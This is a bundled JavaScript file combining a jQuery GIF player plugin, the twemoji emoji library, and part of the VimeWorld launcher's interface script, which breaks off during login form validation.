        module.exports = a(require("jquery"))
    } else {
        a(jQuery)
    }
}(function(b) {
    function a(d, c) {
        this.previewElement = d;
        this.options = c;
        this.animationLoaded = false
    }
    a.scopes = new Array();
    a.prototype = {
        supportedFormats: ["gif", "jpeg", "jpg", "png"],
        activate: function() {
            var c = this;
            if (this.previewElement.width() === 0) {
                setTimeout(function() {
                    c.activate()
                }, 100)
            } else {
                c.mode = c.getOption("mode");
                c.wrap();
                c.addSpinner();
                c.addControl();
                c.addEvents()
            }
        },
        wrap: function() {
            this.previewElement.addClass("gifplayer-ready");
            this.wrapper = this.previewElement.wrap("<div class='gifplayer-wrapper'></div>").parent();
            this.wrapper.css("width", this.previewElement.width());
            this.wrapper.css("height", this.previewElement.height());
            this.previewElement.css("cursor", "pointer")
        },
        addSpinner: function() {
            this.spinnerElement = b("<div class = 'spinner'></div>");
            this.wrapper.append(this.spinnerElement);
            this.spinnerElement.hide()
        },
        getOption: function(c) {
            var d = this.previewElement.data(c.toLowerCase());
            if (d != undefined && d != "") {
                return d
            } else {
                return this.options[c]
            }
        },
        addControl: function() {
            var c = this.getOption("label");
            this.playElement = b("<ins class='play-gif'>" + c + "</ins>");
            this.wrapper.append(this.playElement);
            this.playElement.css("top", this.previewElement.height() / 2 - this.playElement.height() / 2);
            this.playElement.css("left", this.previewElement.width() / 2 - this.playElement.width() / 2)
        },
        addEvents: function() {
            var c = this;
            var d = this.getOption("playOn");
            switch (d) {
                case "click":
                    c.playElement.on("click", function(f) {
                        c.previewElement.trigger("click")
                    });
                    c.previewElement.on("click", function(f) {
                        c.getOption("onClick").call(c.previewElement, f);
                        c.loadAnimation();
                        f.preventDefault();
                        f.stopPropagation()
                    });
                    break;
                case "hover":
                    c.previewElement.on("click mouseover", function(f) {
                        c.loadAnimation();
                        f.preventDefault();
                        f.stopPropagation()
                    });
                    break;
                case "auto":
                    console.log("auto not implemented yet");
                    break;
                default:
                    console.log(d + " is not accepted as playOn value.")
            }
        },
        processScope: function() {
            var c = this.getOption("scope");
            if (c) {
                if (a.scopes[c]) {
                    a.scopes[c].stopGif()
                }
                a.scopes[c] = this
            }
        },
        loadAnimation: function() {
            this.processScope();
            this.spinnerElement.show();
            if (this.mode == "gif") {
                this.loadGif()
            } else {
                if (this.mode == "video") {
                    if (!this.videoLoaded) {
                        this.loadVideo()
                    } else {
                        this.playVideo()
                    }
                }
            }
            this.getOption("onPlay").call(this.previewElement)
        },
        stopGif: function() {
            this.gifElement.hide();
            this.previewElement.show();
            this.playElement.show();
            this.resetEvents();
            this.getOption("onStop").call(this.previewElement)
        },
        getFile: function(d) {
            var c = this.getOption(d);
            if (c != undefined && c != "") {
                return c
            } else {
                replaceString = this.previewElement.attr("src");
                for (i = 0; i < this.supportedFormats.length; i++) {
                    pattrn = new RegExp(this.supportedFormats[i] + "$", "i");
                    replaceString = replaceString.replace(pattrn, d)
                }
                return replaceString
            }
        },
        loadGif: function() {
            var e = this;
            e.playElement.hide();
            if (!this.animationLoaded) {
                this.enableAbort()
            }
            var g = this.getFile("gif");
            var d = this.previewElement.width();
            var c = this.previewElement.height();
            this.gifElement = b("<img class='gp-gif-element' width='" + d + "' height=' " + c + " '/>");
            var f = this.getOption("wait");
            if (f) {
                this.gifElement.on({
                    load: function() {
                        e.animationLoaded = true;
                        e.resetEvents();
                        e.previewElement.hide();
                        e.wrapper.append(e.gifElement);
                        e.spinnerElement.hide();
                        e.getOption("onLoadComplete").call(e.previewElement)
                    }
                })
            } else {
                e.animationLoaded = true;
                e.resetEvents();
                e.previewElement.hide();
                e.wrapper.append(e.gifElement);
                e.spinnerElement.hide()
            }
            this.gifElement.css("cursor", "pointer");
            this.gifElement.css("position", "absolute");
            this.gifElement.css("top", "0");
            this.gifElement.css("left", "0");
            this.gifElement.attr("src", g);
            this.gifElement.click(function(h) {
                e.getOption("onClick").call(e.previewElement, h);
                b(this).remove();
                e.stopGif();
                h.preventDefault();
                h.stopPropagation()
            });
            e.getOption("onLoad").call(e.previewElement)
        },
        loadVideo: function() {
            this.videoLoaded = true;
            var f = this.getFile("mp4");
            var j = this.getFile("webm");
            var h = this.previewElement.width();
            var d = this.previewElement.height();
            this.videoElement = b('<video class="gp-video-element" width="' + h + 'px" height="' + d + '" style="margin:0 auto;width:' + h + "px;height:" + d + 'px;" autoplay="autoplay" loop="loop" muted="muted" poster="' + this.previewElement.attr("src") + '"><source type="video/mp4" src="' + f + '"><source type="video/webm" src="' + j + '"></video>');
            var e = this;
            var c = function() {
                if (e.videoElement[0].readyState === 4) {
                    e.playVideo();
                    e.animationLoaded = true
                } else {
                    setTimeout(c, 100)
                }
            };
            var g = this.getOption("wait");
            if (g) {
                c()
            } else {
                this.playVideo()
            }
            this.videoElement.on("click", function() {
                if (e.videoPaused) {
                    e.resumeVideo()
                } else {
                    e.pauseVideo()
                }
            })
        },
        playVideo: function() {
            this.spinnerElement.hide();
            this.previewElement.hide();
            this.playElement.hide();
            this.gifLoaded = true;
            this.previewElement.hide();
            this.wrapper.append(this.videoElement);
            this.videoPaused = false;
            this.videoElement[0].play();
            this.getOption("onPlay").call(this.previewElement)
        },
        pauseVideo: function() {
            this.videoPaused = true;
            this.videoElement[0].pause();
            this.playElement.show();
            this.mouseoverEnabled = false;
            this.getOption("onStop").call(this.previewElement)
        },
        resumeVideo: function() {
            this.videoPaused = false;
            this.videoElement[0].play();
            this.playElement.hide();
            this.getOption("onPlay").call(this.previewElement)
        },
        enableAbort: function() {
            var c = this;
            this.previewElement.click(function(d) {
                c.abortLoading(d)
            });
            this.spinnerElement.click(function(d) {
                c.abortLoading(d)
            })
        },
        abortLoading: function(c) {
            this.spinnerElement.hide();
            this.playElement.show();
            c.preventDefault();
            c.stopPropagation();
            this.gifElement.off("load").on("load", function(d) {
                d.preventDefault();
                d.stopPropagation()
            });
            this.resetEvents();
            this.getOption("onStop").call(this.previewElement)
        },
        resetEvents: function() {
            this.previewElement.off("click");
            this.previewElement.off("mouseover");
            this.playElement.off("click");
            this.spinnerElement.off("click");
            this.addEvents()
        }
    };
    b.fn.gifplayer = function(c) {
        if (/^(play|stop)$/i.test(c)) {
            return this.each(function() {
                c = c.toLowerCase();
                if (b(this).hasClass("gifplayer-ready")) {
                    var d = new a(b(this), null);
                    d.options = {};
                    d.options = b.extend({}, b.fn.gifplayer.defaults, d.options);
                    d.wrapper = b(this).parent();
                    d.spinnerElement = d.wrapper.find(".spinner");
                    d.playElement = d.wrapper.find(".play-gif");
                    d.gifElement = d.wrapper.find(".gp-gif-element");
                    d.videoElement = d.wrapper.find(".gp-video-element");
                    d.mode = d.getOption("mode");
                    switch (c) {
                        case "play":
                            d.playElement.trigger("click");
                            break;
                        case "stop":
                            if (!d.playElement.is(":visible")) {
                                if (d.mode == "gif") {
                                    d.stopGif()
                                } else {
                                    if (d.mode == "video") {
                                        d.videoElement.trigger("click")
                                    }
                                }
                            }
                            break
                    }
                }
            })
        } else {
            return this.each(function() {
                c = b.extend({}, b.fn.gifplayer.defaults, c);
                var d = new a(b(this), c);
                d.activate()
            })
        }
    };
    b.fn.gifplayer.defaults = {
        label: "GIF",
        playOn: "click",
        mode: "gif",
        gif: "",
        mp4: "",
        webm: "",
        wait: false,
        scope: false,
        onPlay: function() {},
        onStop: function() {},
        onClick: function() {},
        onLoad: function() {},
        onLoadComplete: function() {}
    };
    return a
}));
/*! Copyright Twitter Inc. and other contributors. Licensed under MIT */
;
var twemoji = function() {
    var w = {
            base: "https://twemoji.maxcdn.com/v/12.1.4/",
            ext: ".png",
            size: "72x72",
            className: "emoji",
            convert: {
                fromCodePoint: j,
                toCodePoint: c
            },
            onerror: function a() {
                if (this.parentNode) {
                    this.parentNode.replaceChild(s(this.alt, false), this)
                }
            },
            parse: k,
            replace: t,
            test: r
        },
        b = {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            "'": "&#39;",
            '"': "&quot;"
        },
        m = /(?:\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d])|(?:\ud83d[\udc68\udc69])(?:\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f)|[#*0-9]\ufe0f?\u20e3|(?:[©®\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddff]|\ud83c\uddfa\ud83c[\udde6\uddec\uddf2\uddf3\uddf8\uddfe\uddff]|\ud83c\uddfb\ud83c[\udde6\udde8\uddea\uddec\uddee\uddf3\uddfa]|\ud83c\uddfc\ud83c[\uddeb\uddf8]|\ud83c\uddfd\ud83c\uddf0|\ud83c\uddfe\ud83c[\uddea\uddf9]|\ud83c\uddff\ud83c[\udde6\uddf2\uddfc]|\ud83c[\udccf\udd8e\udd91-\udd9a\udde6-\uddff\ude01\ude32-\ude36\ude38-\ude3a\ude50\ude51\udf00-\udf20\udf2d-\udf35\udf37-\udf7c\udf7e-\udf84\udf86-\udf93\udfa0-\udfc1\udfc5\udfc6\udfc8\udfc9\udfcf-\udfd3\udfe0-\udff0\udff4\udff8-\udfff]|\ud83d[\udc00-\udc3e\udc40\udc44\udc45\udc51-\udc65\udc6a\udc6f\udc79-\udc7b\udc7d-\udc80\udc84\udc88-\udca9\udcab-\udcfc\udcff-\udd3d\udd4b-\udd4e\udd50-\udd67\udda4\uddfb-\ude44\ude48-\ude4a\ude80-\udea2\udea4-\udeb3\udeb7-\udebf\udec1-\udec5\uded0-\uded2\uded5\udeeb\udeec\udef4-\udefa\udfe0-\udfeb]|\ud83e[\udd0d\udd0e\udd10-\udd17\udd1d\udd20-\udd25\udd27-\udd2f\udd3a\udd3c\udd3f-\udd45\udd47-\udd71\udd73-\udd76\udd7a-\udda2\udda5-\uddaa\uddae-\uddb4\uddb7\uddba\uddbc-\uddca\uddd0\uddde-\uddff\ude70-\ude73\ude78-\ude7a\ude80-\ude82\ude90-\ude95]|[\u23e9-\u23ec\u23f0\u23f3\u267e\u26ce\u2705\u2728\u274c\u274e\u2753-\u2755\u2795-\u2797\u27b0\u27bf\ue50a])|\ufe0f/g,
        x = /\uFE0F/g,
        g = String.fromCharCode(8205),
        z = /[&<>'"]/g,
        d = /^(?:iframe|noframes|noscript|script|select|style|textarea)$/,
        u = String.fromCharCode;
    return w;

    function s(B, A) {
        return document.createTextNode(A ? B.replace(x, "") : B)
    }

    function n(A) {
        return A.replace(z, y)
    }

    function l(B, A) {
        return "".concat(A.base, A.size, "/", B, A.ext)
    }

    function e(D, E) {
        var F = D.childNodes,
            C = F.length,
            B, A;
        while (C--) {
            B = F[C];
            A = B.nodeType;
            if (A === 3) {
                E.push(B)
            } else {
                if (A === 1 && !("ownerSVGElement" in B) && !d.test(B.nodeName.toLowerCase())) {
                    e(B, E)
                }
            }
        }
        return E
    }

    function o(A) {
        return c(A.indexOf(g) < 0 ? A.replace(x, "") : A)
    }

    function q(D, Q) {
        var L = e(D, []),
            C = L.length,
            H, E, O, M, B, P, I, G, K, F, J, N, A;
        while (C--) {
            O = false;
            M = document.createDocumentFragment();
            B = L[C];
            P = B.nodeValue;
            G = 0;
            while (I = m.exec(P)) {
                K = I.index;
                if (K !== G) {
                    M.appendChild(s(P.slice(G, K), true))
                }
                J = I[0];
                N = o(J);
                G = K + J.length;
                A = Q.callback(N, Q);
                if (N && A) {
                    F = new Image;
                    F.onerror = Q.onerror;
                    F.setAttribute("draggable", "false");
                    H = Q.attributes(J, N);
                    for (E in H) {
                        if (H.hasOwnProperty(E) && E.indexOf("on") !== 0 && !F.hasAttribute(E)) {
                            F.setAttribute(E, H[E])
                        }
                    }
                    F.className = Q.className;
                    F.alt = J;
                    F.src = A;
                    O = true;
                    M.appendChild(F)
                }
                if (!F) {
                    M.appendChild(s(J, false))
                }
                F = null
            }
            if (O) {
                if (G < P.length) {
                    M.appendChild(s(P.slice(G), true))
                }
                B.parentNode.replaceChild(M, B)
            }
        }
        return D
    }

    function h(B, A) {
        return t(B, function(C) {
            var D = C,
                E = o(C),
                H = A.callback(E, A),
                G, F;
            if (E && H) {
                D = "<img ".concat('class="', A.className, '" ', 'draggable="false" ', 'alt="', C, '"', ' src="', H, '"');
                G = A.attributes(C, E);
                for (F in G) {
                    if (G.hasOwnProperty(F) && F.indexOf("on") !== 0 && D.indexOf(" " + F + "=") === -1) {
                        D = D.concat(" ", F, '="', n(G[F]), '"')
                    }
                }
                D = D.concat("/>")
            }
            return D
        })
    }

    function y(A) {
        return b[A]
    }

    function f() {
        return null
    }

    function p(A) {
        return typeof A === "number" ? A + "x" + A : A
    }

    function j(B) {
        var A = typeof B === "string" ? parseInt(B, 16) : B;
        if (A < 65536) {
            return u(A)
        }
        A -= 65536;
        return u(55296 + (A >> 10), 56320 + (A & 1023))
    }

    function k(B, A) {
        if (!A || typeof A === "function") {
            A = {
                callback: A
            }
        }
        return (typeof B === "string" ? h : q)(B, {
            callback: A.callback || l,
            attributes: typeof A.attributes === "function" ? A.attributes : f,
            base: typeof A.base === "string" ? A.base : w.base,
            ext: A.ext || w.ext,
            size: A.folder || p(A.size || w.size),
            className: A.className || w.className,
            onerror: A.onerror || w.onerror
        })
    }

    function t(A, B) {
        return String(A).replace(m, B)
    }

    function r(B) {
        m.lastIndex = 0;
        var A = m.test(B);
        m.lastIndex = 0;
        return A
    }

    function c(E, A) {
        var C = [],
            F = 0,
            D = 0,
            B = 0;
        while (B < E.length) {
            F = E.charCodeAt(B++);
            if (D) {
                C.push((65536 + (D - 55296 << 10) + (F - 56320)).toString(16));
                D = 0
            } else {
                if (55296 <= F && F <= 56319) {
                    D = F
                } else {
                    C.push(F.toString(16))
                }
            }
        }
        return C.join(A || "-")
    }
}();
/*! Copyright (c) 2015-2016, xtrafrancyz (http://xtrafrancyz.net)
 * VimeWorld.ru Launcher script
 */
;
vw = {
    showInvalidLaunch: function() {
        overlay.show(function() {
            $("#invalid-launch-popup").removeClass("active")
        }, true);
        $("#invalid-launch-popup").addClass("active")
    },
    showNeedUpdate: function() {
        overlay.show(function() {}, false);
        $("#update-popup").addClass("active")
    },
    gameLoading: false
};
var tooltipster_error = {
    timer: 1500,
    position: "top-right",
    trigger: "custom",
    theme: "tooltipster-red",
    restoration: "none",
    contentCloning: false,
    offsetY: -4
};
var tooltipster_hover = {
    timer: 1500,
    position: "top-right",
    trigger: "hover",
    theme: "tooltipster-default",
    restoration: "none",
    contentCloning: false,
    offsetY: -4
};
window.onerror = function() {
    if (window._common != undefined) {
        _common.onerror(arguments)
    }
};

function ajax(a) {
    if (a.type == undefined) {
        a.type = "get"
    }
    if (a.data == undefined) {
        a.data = ""
    } else {
        var c = a.data;
        a.data = "";
        var b = 0;
        for (key in c) {
            if (b++ != 0) {
                a.data += "&"
            }
            a.data += key + "=" + escape(c[key])
        }
    }
    _common.ajax(a)
}
var overlay = {
    show: function(b, a) {
        this.hideOnClick = a;
        this.callback = b;
        $("#overlay").addClass("active").animate({
            opacity: 1
        })
    },
    hide: function() {
        this._close();
        if (this.callback != undefined) {
            this.callback();
            this.callback = undefined
        }
    },
    click: function() {
        if (this.callback == undefined || !this.hideOnClick) {
            return
        }
        this.hide()
    },
    closeNow: function() {
        if (this.callback != undefined) {
            this.callback();
            this.callback = undefined
        }
        $("#overlay").css({
            opacity: 0
        }).removeClass("active")
    },
    closeNoCallback: function() {
        this._close();
        this.callback = undefined
    },
    _close: function() {
        if (this.callback == undefined) {
            return
        }
        $("#overlay").animate({
            opacity: 0
        }, {
            complete: function() {
                $("#overlay").removeClass("active")
            }
        })
    }
};
$(document).on("vimeworld:load", function() {
    _common.print("Init...")
});
$(document).ready(function() {
    $("img").on("dragstart", function(b) {
        b.preventDefault()
    });
    $(document).keydown(function(b) {
        if (b.keyCode == 9) {
            b.preventDefault()
        }
    });
    $("input[data-enter-blur]").keydown(function(b) {
        if (b.keyCode == 13) {
            $(b.target).blur()
        }
    });
    var a;
    $("*").mousedown(function(c) {
        if (c.bypass != undefined) {
            return true
        }
        $elem = $(c.target);
        if ($elem[0].nodeName == "LABEL" && $elem[0].hasAttribute("for")) {
            $elem = $("#" + $elem.attr("for"))
        }
        var b = ($elem[0].nodeName == "INPUT" || $elem[0].nodeName == "SELECT") && (a = $elem);
        if (b || $elem.attr("selectable") != undefined) {
            c.bypass = true;
            return true
        }
        window.getSelection().removeAllRanges();
        if (a != undefined) {
            a.blur();
            a = undefined
        }
        return false
    });
    $.fn.tooltipster("setDefaults", {
        animation: "grow",
        contentAsHTML: true
    });
    $(".tooltip").tooltipster();
    $("#overlay").click(function(b) {
        if (b.target != this) {
            return
        }
        overlay.click()
    });
    (function() {
        var b = function() {
            $(this).attr("class", "tab hidden")
        };
        $(".header .menu a").click(function() {
            var c = $(this);
            if (c.hasClass("active") || c.attr("href").lastIndexOf("#", 0) !== 0) {
                return
            }
            $(".header .menu a").removeClass("active");
            c.addClass("active");
            $("#content .tab:not(.hidden)").attr("class", "tab animated fadeOutDown").one("webkitAnimationEnd animationend", b);
            $("#" + c.attr("href").substr(1)).trigger("tab:open").off("webkitAnimationEnd animationend", b).attr("class", "tab animated fadeInDown")
        })
    })();
    $(".dropdown > div").click(function() {
        var b = $(this).parent();
        if (b.hasClass("active")) {
            b.find("ul").removeClass("zoomIn").addClass("zoomOutRight").one("webkitAnimationEnd animationend", function() {
                b.removeClass("active")
            })
        } else {
            b.addClass("active").find("ul").removeClass("zoomOutRight").addClass("animated").addClass("zoomIn")
        }
    });
    $(document).mouseup(function(c) {
        var b = $(".dropdown");
        if (!b.is(c.target) && (b.has(c.target).length === 0 || !c.target.hasAttribute("do-not-close"))) {
            b.filter(".active").find(">div").trigger("click")
        }
    });
    $("#gui_close").click(function(b) {
        _gui.exit()
    });
    $("#gui_min").click(function(b) {
        _common.minimize()
    });
    $(".header").mousedown(function(b) {
        b.stopImmediatePropagation();
        _common.startDrag();
        return false
    });
    $("#drag-resize").mousedown(function(b) {
        b.stopImmediatePropagation();
        _common.startResize();
        return false
    });
    $("body").on("click", "a", function(g) {
        g.preventDefault();
        var b = $(this).attr("href");
        if (b == undefined) {
            return
        }
        if (b.lastIndexOf("http:", 0) == 0 || b.lastIndexOf("https:", 0) == 0 || b.lastIndexOf("//", 0) == 0) {
            _common.openURL(b);
            return
        }
        if (b.substr(0, 1) == "@") {
            if (b.indexOf(":") > 0) {
                var c = b.split(":");
                var f = c[0];
                var d = c[1];
                switch (f) {
                    case "@click":
                        $(d).trigger("click");
                        break;
                    case "@tab":
                        $('.header .menu a[href="#' + d + '"]').trigger("click");
                        break
                }
            }
        }
    });
    setInterval(function() {
        $(".time-from-now").each(function() {
            $(this).text(moment($(this).attr("data-time"), "X").fromNow())
        })
    }, 30000)
});
$(document).ready(function() {
    $("#auth-form").submit(function() {
        var e = $(this).find('input[name="username"]');
        var a = $(this).find('input[name="password"]');
        var g = e.val();
        var b = a.val();
        if (g.length < 3 || g.length > 16) {
            e.tooltipster($.extend(tooltipster_error, {
                content: "От 3 до 16 символов"
            })).tooltipster("show");
            return false
        }
        if (b == null || b.length < 6) {
